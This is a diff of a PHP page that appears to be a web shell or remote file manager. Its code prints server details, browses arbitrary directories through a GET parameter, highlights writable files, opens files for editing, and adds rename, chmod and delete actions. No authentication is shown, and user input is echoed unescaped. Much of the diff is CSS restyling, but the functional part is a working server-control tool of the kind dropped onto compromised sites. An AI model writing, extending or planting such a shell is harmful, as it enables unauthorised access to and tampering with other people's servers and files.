@@ -21,7 +21,7 @@ table {
   border-spacing:0;
   width: 70%;
   border-radius:10px;
-  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
+  box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
 }
 
 table caption {
@@ -51,14 +51,22 @@ table th {
 }
 textarea {
 	padding: 12px 20px;
-	width:93%;
-	height:300px;
+	width:94%;
+	height:200px;
 	resize:none;
 	-moz-border-bottom-colors: none;
   	-moz-border-left-colors: none;
   	-moz-border-right-colors: none;
   	-moz-border-top-colors: none;
   	outline:none;
+  	border-radius:6px;
+  	border:1px solid rgba(222,222,222,0.73);
+  	background:rgba(222,222,222,0.73);
+  	color:#8a8a8a;
+}
+a {
+	color:#8a8a8a;
+	text-decoration:none;
 }
 input[type=submit] {
   font-family: 'Ubuntu Mono', monospace;
@@ -70,6 +78,16 @@ input[type=submit] {
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
 }
+input[type=text].action {
+	width:87.5%;
+	font-family: 'Ubuntu Mono', monospace;
+	padding:12px;
+	color:#8a8a8a;
+	border-radius:7px;
+	border: 1px solid #e8e8e8;
+	outline:none;
+	background:#e8e8e8;
+}
 table tr:last-child {
 	border-bottom:none;
 }
@@ -79,27 +97,34 @@ td.not {
 td.yes {
 	border-bottom: 2px solid #e8e8e8;
 }
-.modal {
-	float:left;clear:both;
-	display:none;
-	position:relative;
-	width:50%;
-  top:-400px;
-  right:-400px;
+ul.action {
+	background:transparent;
+	padding: 10px 10px;
+    border-radius:7px;
 }
-.modal a.close-modal { 
-	position:absolute;
-	top:-10.5px;
-	right:-12.5px;
-	display:block;
-	width:30px;
-	height:30px;
-	text-indent:-9999px;
-	background-size:contain;
-	background-repeat:no-repeat;
-	background-position:center center;
-	background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
-			}
+li.action {
+	text-align:left;
+	list-style:none;
+	border:1px solid #e8e8e8;
+	padding:10px 20px;
+}
+li.action:last-child {
+	border-radius:0px 0px 7px 7px;
+	border-top:none;
+}
+li.action:first-child {
+	border-radius:7px 7px 0px 0px;
+}
+li.action:nth-child(2) {
+	border-top:none;
+}
+li.action:hover {
+	background: #e8e8e8;
+	cursor: pointer;
+}
+div.action {
+	width:50%;
+}
 @media screen and (max-width: 600px) {
   table {
   margin: 0;
@@ -108,28 +133,15 @@ td.yes {
   width: 100%;
   border-radius:10px;
 }
-
-.modal {
-  float:left;clear:both;
-  display:none;
-  position:relative;
-  width:50%;
-  top:-400px;
-  left:-400px;
+.strong {
+	font-size:10px;
 }
-.modal a.close-modal { 
-  position:absolute;
-  top:-10.5px;
-  right:-12.5px;
-  display:block;
-  width:30px;
-  height:30px;
-  text-indent:-9999px;
-  background-size:contain;
-  background-repeat:no-repeat;
-  background-position:center center;
-  background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
-      }
+div.action {
+	width:100%;
+}
+input[type=text].action {
+	width:90%;
+}
   
   table thead {
     border: none;
@@ -150,7 +162,7 @@ td.yes {
   
   textarea {
 	padding: 12px 20px;
-	width:90%;
+	width:91%;
   }
   
   th.pol, td.pol {
@@ -161,10 +173,19 @@ td.yes {
   }
 </style>
 <body>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
 <center>
 <table>
+<thead>
+	<tr>
+		<td class="yes" colspan="4">
+			<?php
+			foreach (get_server_info() as $k) {
+    			echo "<div>".$k."</div>";
+    		}
+    		?>
+    	</td>
+    </tr>
+</thead>
 <?php
 function cwd() {
   if (isset($_GET['path'])) {
@@ -173,18 +194,6 @@ function cwd() {
   } else {
     $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
   } return $cwd;
-}
-function pwd() {
-  $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
-  foreach ($dir as $key => $pwd) {
-    print("<a href='?path=");
-    for ($i=0; $i <= $key ; $i++) { 
-      print($dir[$i]);
-      if ($i != $key) {
-        print(DIRECTORY_SEPARATOR);
-      }
-    } print("'>".$pwd."</a>/");
-  }
 }
 function perms($file) {
 $perms = fileperms($file);
@@ -240,7 +249,7 @@ return $info;
 }
 function permission($filename, $perms, $po=false) {
   if (is_writable($filename)) {
-    ?> <font color="#8a8a8a"><?php print $perms ?></font> <?php
+    ?> <font color="green"><?php print $perms ?></font> <?php
   } else {
     ?> <font color="red"><?php print $perms ?></font> <?php
   }
@@ -261,6 +270,31 @@ function size($file) {
     } else {
         return '0 bytes';
     }
+}
+if (@$_GET['action'] == 'dir') {
+	$file = $_GET['file'];
+	?>
+	<thead>
+		<tr>
+			<th>ACTION</th>
+		</tr>
+	</thead>
+	<tr>
+		<td class="not">
+			<center>
+				<div class="action">
+					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
+					<ul class="action">
+						<li class="action"><a href="#rename">RENAME</a></li>
+						<li class="action"><a href="#chmod"> CHMOD</a></li>
+						<li class="action"><a href="#delete">DELETE</a></li>
+					</ul>
+				</div>
+			</center>
+		</td>
+	</tr>
+	<?php
+	exit();
 }
 if (isset($_GET['edit'])) {
 	$file = $_GET['file'];
@@ -306,36 +340,47 @@ function get_server_info(){
     return $server_info;
   }
 ?>
-<thead>
-	<tr>
-		<td class="yes" colspan="3">
-			<?php
-			foreach (get_server_info() as $k) {
-    			echo "<div>".$k."</div>";
-    		}
-    		?>
-    	</td>
-    </tr>
-</thead>
   <tbody>
   <?php
   $scandir = scandir(cwd());
-  $result  = array_diff($scandir, array('.', '..'));
-  if (count($result) > 0) {
-  	foreach ($result as $dir) {
+  	foreach ($scandir as $dir) {
   		if (is_dir($dir)) {
+  			if ($dir === '..') {
+  				$back = "<a href='?path=".dirname(cwd())."'>".$dir."</a>";
+  			} elseif($dir === '.') {
+  				$back = "<a href='?path=".cwd()."'>".$dir."</a>";
+  			} else {
+  				$back = "<a href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
+  			} if ($dir === '.' || $dir === '..') {
+  				$action = "";
+  			} else {
+  				$action = '<a href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">Action</a>';
+  			}
   			?>
   			<tr>
-  				<td class="tol"><?= permission($dir, "<a href='?path=".cwd().'/'.$dir."'>".$dir."</a>") ?></td>
-  				<td class="pol">
-  					<center>--</center>
+  				<td class="tol">
+  					<?=$back?>
   				</td>
-      			<td>
+  				<td class="pol">
+  					<center>
+  						<?= filetype(cwd().'/'.$dir) ?>
+  					</center>
+  				</td>
+  				<td>
+  					<center>
+  						<?= permission($dir, perms($dir)) ?>
+  					</center>
+  				</td>
+  				<td>
+  					<center>
+  						<?= $action ?>
+  					</center>
+  				</td>
   			</tr>
   			<?php
   		}
   	}
-  	foreach ($result as $file) {
+  	foreach ($scandir as $file) {
   		if (is_file($file)) {
   			$files = cwd().'/'.$file
   			?>
@@ -344,34 +389,24 @@ function get_server_info(){
   				<td class="pol">
   					<center><?= size($files); ?></center>
   				</td>
+  				<td>
+  					<center>
+  						<?= permission($files, perms($files)) ?>
+  					</center>
+  				</td>
       			<td>
       				<center>
-      					<a href="?path=<?=cwd()?>&edit&file=<?=$files?>" rel="modal:open">Action</a>
+      					<a href="?path=<?=cwd()?>&edit&file=<?=$files?>">Action</a>
       				</center>
       			</td>
   			</tr>
   			<?php
   		}
   	}
-  } else {
-  	?>
-    <tr>
-      <td>
-        <span style="color:red;">ERROR: No files found in the directory.</span>
-      </td>
-    </tr>
-    <?php
-  }
   ?>
+
 </tbody>
 </table>
-<script>
-  $(function() {
-    $('a[data-modal]').on('click', function() {
-      $($(this).data('modal')).modal();
-      return false;
-    });
-  });
 </script>
 </center>
 </body>
